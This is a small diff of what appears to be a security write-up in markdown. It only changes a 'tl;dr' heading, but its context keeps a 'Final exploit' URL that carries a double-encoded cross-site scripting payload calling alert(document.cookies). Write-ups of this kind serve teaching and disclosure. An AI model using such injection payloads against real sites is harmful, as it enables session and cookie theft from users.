@@ -21,5 +21,5 @@ Having this on my mind, I crafted a payload for this endpoint (and by crafting, 
 
 Final exploit: `https://example.com/enpoint?redir=/%2527)%253B%2520alert(document.cookies)%253B%252F%252F`
 
-tl;dr
+## tl;dr
 ![carbon](../images/carbon.png)
